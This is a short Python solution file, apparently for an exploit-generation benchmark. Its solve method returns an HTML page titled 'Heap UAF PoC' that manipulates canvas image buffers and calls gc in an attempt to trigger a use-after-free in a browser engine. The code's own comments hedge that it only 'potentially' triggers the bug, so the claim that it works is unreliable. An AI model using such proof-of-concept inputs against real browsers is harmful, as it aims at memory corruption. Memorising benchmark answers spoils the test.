class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = '''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Heap UAF PoC</title>
</head>
<body>
    <canvas id="canvas" width="256" height="256" style="display: none;"></canvas>
    <script>
        function triggerUAF() {
            const canvas = document.getElementById('canvas');
            const ctx = canvas.getContext('2d');
            // Fill canvas
            ctx.fillStyle = '#FF0000';
            ctx.fillRect(0, 0, 256, 256);
            // Get image data - Uint8ClampedArray
            let imageData = ctx.getImageData(0, 0, 256, 256);
            let data = imageData.data;
            // Manipulate to potentially trigger buffer handling issues
            for (let i = 0; i < data.length; i += 4) {
                data[i] = 0;     // R
                data[i + 1] = 255; // G
                data[i + 2] = 0;   // B
                data[i + 3] = 128; // A - partial transparency
            }
            // Put back
            ctx.putImageData(imageData, 0, 0);
            // Create new Uint8ClampedArray from buffer - potential UAF if not properly detached
            const clamped = new Uint8ClampedArray(data.buffer);
            // Access after potential free point
            clamped[0] = 255;
            // Force GC or something, but in JS hard; rely on engine bug
            if (window.gc) window.gc();
            // Use again
            ctx.putImageData(new ImageData(new Uint8ClampedArray(clamped), 256, 256), 0, 0);
            // Additional access
            console.log(clamped[0]);
        }
        triggerUAF();
    </script>
</body>
</html>'''
        return poc.encode('utf-8')